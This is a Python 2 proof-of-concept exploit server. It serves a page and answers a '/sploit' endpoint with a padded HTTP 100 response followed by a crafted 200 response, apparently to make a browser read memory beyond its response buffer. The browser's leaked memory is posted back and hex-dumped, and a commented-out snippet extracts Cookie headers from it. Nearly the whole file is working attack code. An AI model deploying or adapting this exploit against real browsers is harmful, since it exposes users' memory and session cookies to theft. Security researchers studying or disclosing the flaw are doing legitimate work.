import BaseHTTPServer, json, sys, socket;

gxReadSizeRange = xrange(512, 2048);
giReadSize = 2048;
giReadSizeChange = -0x10;
def sploit(oHTTPServer, sBody):
  global gxReadSizeRange, giReadSize, giReadSizeChange;
  iReadSize = giReadSize;
  giReadSize += giReadSizeChange;
  if giReadSize not in gxReadSizeRange:
    giReadSizeChange = -giReadSizeChange;
    giReadSize += 2 * giReadSizeChange;
  # The size of the HTTP 1xx response determines how many bytes can be read beyond the next response.
  # This HTTP 1xx response is padded to allow reading the desired amount of bytes:
  print "\r%s \r" % iReadSize,;
  sFirstResponse = pad("HTTP/1.1 100 %s\r\n\r\n", iReadSize);
  oHTTPServer.wfile.write(sFirstResponse);
  # The size of the second response determines where in the buffer reading of data beyond the response starts.
  # For a new connection, the buffer start empty and grows in 4K increments. If the HTTP 1xx response and the second
  # response have a combined size of less then 4K, the buffer will be 4K in size. If the second response is padded
  # correctly, the first byte read beyond it will be the first byte beyond the buffer, which increases the chance of
  # reading something useful.
  sSecondResponse = pad("HTTP/1.1 200 %s\r\nx: x", 4 * 1024 - 1 - len(sFirstResponse));
  oHTTPServer.wfile.write(sSecondResponse);
  oHTTPServer.wfile.close();
  
  if sBody:
    sLeakedMemory = json.loads(sBody);
    assert sLeakedMemory.endswith("\r\n"), \
        "Expected CRLF is missing: %s" % repr(sLeakedMemory);
    asLeakedMemoryChunks = sLeakedMemory[:-2].split("\r\n");
    sFirstChunk = None;
    for sLeakedMemoryChunk in asLeakedMemoryChunks:
      if sLeakedMemoryChunk.startswith("x: x"):
        sFirstChunk = sLeakedMemoryChunk[4:];
        if sFirstChunk:
          dump(sFirstChunk);
        asLeakedMemoryChunks.remove(sLeakedMemoryChunk);
#        if len(asLeakedMemoryChunks) == 1:
#          print "A CR/LF/CRLF separates the above memory chunk from the below chunk:";
#        elif len(asLeakedMemoryChunks) > 1:
#          print "A CR/LF/CRLF separates the above memory chunk from the below chunks, their original order is unknown:";
        for sLeakedMemoryChunk in asLeakedMemoryChunks:
          dump(sLeakedMemoryChunk);
        break;
    else:
      dump(sLeakedMemory);

class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
  def handle_one_request(self, *txArgs, **dxArgs):
    try:
      return BaseHTTPServer.BaseHTTPRequestHandler.handle_one_request(self, *txArgs, **dxArgs);
    except socket.error:
      pass;
  def log_request(self, *txArgs, **dxArgs):
    pass;
  def log_error(self, *txArgs, **dxArgs):
    pass;
  def log_message(self, *txArgs, **dxArgs):
    pass;
  def do_GET(self):
    self.do_GET_or_POST();
  def do_POST(self):
    self.do_GET_or_POST();
    
  def __sendFileResponse(self, iCode, sFilePath):
      try:
        oFile = open(sFilePath, "rb");
        sContent = oFile.read();
        oFile.close();
      except:
        self.__sendResponse(500, "Cannot find %s" % sFilePath);
      else:
        self.__sendResponse(iCode, sContent);
  def __sendResponse(self, iCode, sContent):
    self.send_response(iCode);
    self.send_header("accept-ranges", "bytes");
    self.send_header("cache-control", "no-cache, must-revalidate");
    self.send_header("content-length", str(len(sContent)));
    self.send_header("content-type", "text/html");
    self.send_header("date", "Sat Aug 28 1976 09:15:00 GMT");
    self.send_header("expires", "Sat Aug 28 1976 09:15:00 GMT");
    self.send_header("pragma", "no-cache");
    self.end_headers();
    self.wfile.write(sContent);
    self.wfile.close();

  def do_GET_or_POST(self):
    try:
      try:
        iContentLength = int(self.headers.getheader("content-length"));
      except:
        sBody = "";
      else:
        sBody = self.rfile.read(iContentLength);
      if self.path in gdsFiles:
        return self.__sendFileResponse(200, gdsFiles[self.path]);
      elif self.path in gdsFunctions:
        return gdsFunctions[self.path](self, sBody);
      else:
        return self.__sendResponse(404, "Not found");
    except:
      self.server.server_close();
      raise;

def pad(sTemplate, iSize):
  iPadding = iSize - len(sTemplate % "");
  return sTemplate % (iPadding * "A");

def dump(sMemory):
#  import re;
#  oCookie = re.match(".*Cookie\:(.*?)[\r\n$].*", sMemory);
#  if oCookie is not None: print oCookie.groups()[0];
#  return;
  asDWords = []; iDWord = 0; asBytes = []; asChars = [];
  print "-%s-.-%s-.-%s" % (
      ("%d DWORDS" % (len(sMemory) >> 2)).center(35, "-"),
      ("%d BYTES" % len(sMemory)).center(47, "-"),
      "ASCII".center(16, "-"));
  for iIndex in xrange(len(sMemory)):
    sByte = sMemory[iIndex];
    iByte = ord(sByte);
    asChars.append(0x1f < iByte < 0x80 and sByte or ".");
    asBytes.append("%02X" % iByte);
    iBitOffset = (iIndex % 4) * 8;
    iDWord += iByte << iBitOffset;
    if iBitOffset == 24 or (iIndex == len(sMemory) - 1):
      asDWords.append({
        0: "      %02X",
        8: "    %04X",
        16:"  %06X",
        24:"%08X"
      }[iBitOffset] % iDWord);
      iDWord = 0;
    if (iIndex % 16 == 15) or (iIndex == len(sMemory) - 1):
      print " %-35s | %-47s | %s" % (" ".join(asDWords), " ".join(asBytes), "".join(asChars));
      asDWords = []; asBytes = []; asChars = [];

if __name__ == "__main__":
  gdsFiles = {
    "/": "poc.html",
  }
  gdsFunctions = {
    "/sploit": sploit,
  }
  txAddress = ("localhost", 28876);
  oHTTPServer = BaseHTTPServer.HTTPServer(txAddress, RequestHandler);
  print "Serving at: http://%s:%d" % txAddress;
  try:
    oHTTPServer.serve_forever();
  except KeyboardInterrupt:
    pass;
  oHTTPServer.server_close();

